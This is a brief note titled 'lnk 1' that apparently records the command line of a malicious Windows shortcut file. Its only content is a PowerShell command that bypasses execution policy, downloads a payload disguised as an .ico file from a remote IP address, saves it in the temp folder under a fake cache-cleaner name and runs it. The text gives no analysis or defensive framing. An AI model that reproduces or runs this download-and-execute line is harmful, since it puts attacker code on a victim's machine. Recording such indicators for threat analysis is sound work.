# lnk 1

%WinDir%\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit -Command "& { iwr -Uri 'http://5.5.5.5/x/2.ico' -OutFile $env:TEMP\ClearCashe.ps1; & $env:TEMP\ClearCashe.ps1 }"
